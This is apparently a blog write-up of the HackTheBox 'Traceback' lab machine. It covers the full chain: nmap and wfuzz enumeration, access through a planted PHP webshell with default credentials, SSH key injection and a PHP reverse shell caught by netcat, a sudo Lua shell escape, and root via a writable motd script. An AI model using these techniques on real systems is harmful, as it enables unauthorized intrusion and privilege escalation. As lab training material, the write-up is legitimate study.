---
title: HackTheBox-Traceback
author: a3nk17
date: 2020-08-14
excerpt: TraceBack is pretty Simple Machine,in that The target drone is a Linux machine and a website is deployed, but the website has been ruined. Hackers have left some clues and tools on the service. We need to use these clues and tools to get root and user flag.
thumbnail: /assets/img/posts/traceback/info.png
categories: [HackTheBox, Active]
tags: [npm, Window, PHP, ReverseShell, ssh,]
---


![info](/assets/img/posts/traceback/info.png)


The target drone is a Linux machine and a website is deployed, but the website has been ruined. Hackers have left some clues and tools on the service. We need to use these clues and tools to get root and flag. First find the hacker’s information through social workers, find some webshell clues from his github, and then use wfuzz to find
Find the webshell transmitted by the hacker to the target site, use the webshell to get the webadmin account permissions, and then find a channel to execute the lua script to increase the permissions through the clues on the host, and then obtain another high-privileged account sysadmin, and then discover the local through pspy monitoring There are some timed task scripts that are executed with privileges, and the scripts are modified to execute reverse shell to obtain root privileges.



Machine Information
====================



|Conten| Descripcion |
|-----------|--------------|
| OS       |  Linux |
| Dificulty    | Easy |
| Points   | 20 |
| Release      | 14-Mar-2020 |
| IP    | 10.10.10.181 |
| Creator Of The System: | [Xh4H](https://www.hackthebox.eu/home/users/profile/21439)  |


Synopsis
=========
1. Open Ports Enumeration
2. Web Service Enumeration
3. by using `PHP-RevrseShell` Backdoor identified
4. SSH Key injected
5. Gaing Access To `Webadmin`
6. User shell gained by exploiting sudo permissions
7. Write access to SSH `welcome banner` identified
8. ROOT shell 

Tools and Tips
================

* nmap
* pspy
* gtfobins
* OSINT
* SSH with public key

Starting The Attack
====================

Initial Enumeration
--------------------

```bash
root@vultr:~/htb# nmap -sV -sC 10.10.10.181
Starting Nmap 7.70 ( https://nmap.org ) at 2020-08-14 08:06 UTC
Nmap scan report for 10.10.10.181
Host is up (0.076s latency).
Not shown: 984 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp    open     http           Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
416/tcp   filtered silverplatter
1011/tcp  filtered unknown
1130/tcp  filtered casp
1521/tcp  filtered oracle
2119/tcp  filtered gsigatekeeper
3476/tcp  filtered nppmp
4900/tcp  filtered hfcs
5440/tcp  filtered unknown
5903/tcp  filtered vnc-3
6580/tcp  filtered parsec-master
7741/tcp  filtered scriptview
8292/tcp  filtered blp3
32773/tcp filtered sometimes-rpc9
52869/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

Nmap returned some classic ports : default `SSH (22)` and default `HTTP (80)`. Since `SSH` isn’t usually an attack vector, I decided to go and see what was on port `80`

When we look at the web service running on port `80` from our browser, it says that the page is owned and a `backdoor` is placed.

![](/assets/img/posts/traceback/1.png)


Wow, that was unexpected. Looks like this page was already hacked by someone (in fact it was the box maker).
He left us a backdoor so we can access the server too. What a nice guy :)
Now I only had to find what was that backdoor. While inspecting the HTML source code, I saw a comment he left also 


While inspecting the HTML source code, I saw a comment he left also 

```html


<!-- Some of the best web shells that you might need ;) -->
```

Find Rabbit Whole 
==================

Use `wfuzz` to blast the directory and find the `webshell` file `smevk.php` used by the x4hr.

```bash
root@vkali:~/ wfuzz -w ./fuzz.txt -u http://10.10.10.181/FUZZ --hc 404,403

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.181/FUZZ
Total requests: 17

==================================================================
ID   Response   Lines      Word         Chars          Payload
==================================================================

000017:  C=200     44 L      151 W         1113 Ch        ""
000015:  C=200     58 L      100 W         1261 Ch        "smevk.php"

Total time: 0.241917
Processed Requests: 17
Filtered Requests: 15
```

Vulnerability discovery and exploitation
=========================================

With the backdoor identified, browsing to [http://10.10.10.181/smevk.php](http://10.10.10.181/smevk.php)

![](/assets/img/posts/traceback/2.png)

Tr to login with Most secure Cred in Internet
USER:- `admin`
PWD:- `admin`

Here we are , `Access Granted`

![](/assets/img/posts/traceback/3.png)

Backdoor creating
-------------------


Visit it with a browser and find that it is a fully functional webshell. The current user is `webadmin`.
In order to ensure the stability of the connection, we put a public key under `/home/webadmin/.ssh`, and the machine uses the private key to log in


ssh
----

First generate a `public` and `private` key pair `locally`

```bash
root@kali:~# ssh-keygen -t rsa
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in /root/.ssh/id_rsa.
Your public key has been saved in /root/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:2YE9x2+Eyr/bU1JkYYAbvgxxVvScvIBB1kV0qBUnWR0 root@vultr.guest
The key's randomart image is:
+---[RSA 2048]----+
|          .+=+BEB|
|         +.*ooOo*|
|        . O.*+.B |
|         = B.o. o|
|        S * . oo |
|           + .. .|
|            .  o |
|             o.  |
|            o... |
+----[SHA256]-----+
root@kali:~# ls -l /root/.ssh/
total 12
-rw------- 1 root root 1823 May 28 08:39 id_rsa
-rw-r--r-- 1 root root  398 May 28 08:39 id_rsa.pub
-rw-r--r-- 1 root root  666 May 28 03:03 known_hosts
```

We upload the copied `authorized_keys` file to the `ssh` folder of the system with the help of the `panel`.

![](/assets/img/posts/traceback/4.png)


Now we can login to webadmin user with ssh

```shell 
root@kali$ ssh -i id_rsa webadmin@10.10.10.181 
################################# 
-------- OWNED BY XH4H  --------- 
- I guess stuff could have been configured better ^^ - 
################################# 
 
Welcome to Xh4H land  
 
 
 
Last login: Thu Aug 14 06:29:02 2020 from 10.10.14.3 
webadmin@traceback:~$ 
```

2nd Way for Diging Rabit whole
================================

We can get acces to `webadmin` by using `PHP Reverse Shell` method


 Upload [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell)  script through Code Injector module.
 
 ![](/assets/img/posts/traceback/5.png)
 
 
Now I can get a php reverse shell

![](/assets/img/posts/traceback/6.png)



Getting User Access
--------------------

open any `porn` on terminal

we got reverse shell after goto uploaded dir

```bash
$ nc -lvvp 4444
listening on [any] 4444 ...
10.10.10.181: inverse host lookup failed: Unknown host
connect to [10.10.16.99] from (UNKNOWN) [10.10.10.181] 33430
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
$ cd /home/webadmin
$ ls -la
total 44
drwxr-x--- 5 webadmin sysadmin 4096 Mar 16 04:03 .
drwxr-xr-x 4 root     root     4096 Aug 25  2019 ..
-rw------- 1 webadmin webadmin  105 Mar 16 04:03 .bash_history
-rw-r--r-- 1 webadmin webadmin  220 Aug 23  2019 .bash_logout
-rw-r--r-- 1 webadmin webadmin 3771 Aug 23  2019 .bashrc
drwx------ 2 webadmin webadmin 4096 Aug 23  2019 .cache
drwxrwxr-x 3 webadmin webadmin 4096 Aug 24  2019 .local
-rw-rw-r-- 1 webadmin webadmin    1 Aug 25  2019 .luvit_history
-rw-r--r-- 1 webadmin webadmin  807 Aug 23  2019 .profile
drwxrwxr-x 2 webadmin webadmin 4096 Feb 27 06:29 .ssh
-rw-rw-r-- 1 sysadmin sysadmin  122 Mar 16 03:53 note.txt
```

In the `home` directory of webadmin, there are mainly two files `note.txt` and `.bash_history`

 ```bash
 $ cat note.txt
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
$ cat .bash_history
ls -la
sudo -l
nano privesc.lua
sudo -u sysadmin /home/sysadmin/luvit privesc.lua 
rm privesc.lua
logout
```

Use `sudo -l` to check and find that the problem file we are looking for can be read `without a password`. 

The content is just one sentence `os.execute("/bin /bash")`
According to the prompts obtained above, execute `sudo -u sysadmin /home/sysadmin/luvit script.lua` to switch directly to `sysadmin's bash`, and move to sysadmin's home directory to obtain `user.txt`


```bash
$ echo 'os.execute("/bin/sh")' > privesc.lua
$ cat privesc.lua
os.execute("/bin/sh")
$sudo -u sysadmin /home/sysadmin/luvit privesc.lua
sh: turning off NDELAY mode

$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
cd /home/sysadmin 
ls
luvit
user.txt
```
![](/assets/img/posts/traceback/user.png)


Privilege Escalation
=====================


Move to this directory and find that the content in 000-header


```bash
$ find / -perm /220
---SNIP---
/etc/update-motd.d 
/etc/update-motd.d/50-motd-news 
/etc/update-motd.d/10-help-text 
/etc/update-motd.d/91-release-upgrade 
/etc/update-motd.d/00-header
---SNIP---
```


Root Shell
-----------

Modify the header file 

```bash
echo "cat /root/root.txt" >> 00-header
```

open another terminal and try another `ssh login`

```bash
$ ssh -i id_rsa webadmin@10.10.10.181
```

![](/assets/img/posts/traceback/root.png)


in the End nothing is matter


![](/assets/img/posts/traceback/fuck.png)


# Resources

[targetRecon](https://github.com/4m0r/targetRecon)

[Web-Shells Repository](https://github.com/TheBinitGhimire/Web-Shells)

[../lua on GTFOBins](https://gtfobins.github.io/gtfobins/lua/)

[updte-motd on Ubuntu Manual](http://manpages.ubuntu.com/manpages/xenial/man5/update-motd.5.html)

